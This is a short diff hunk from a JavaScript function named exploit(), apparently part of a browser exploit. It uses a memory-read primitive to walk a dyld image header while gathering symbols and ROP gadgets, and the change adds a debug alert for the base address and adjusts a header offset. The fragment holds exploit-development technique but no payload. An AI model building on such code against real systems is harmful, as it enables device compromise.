@@ -708,7 +708,8 @@ function exploit(){
        
         var syms = {};
         var gadgets = {};
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x8)));
+        alert(“dyld vase address” + memory.u32(hdr + 0x20) + hdr)
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
         alert(nimgs + "n")
         for(var i = 0; i < nimgs; ++i)
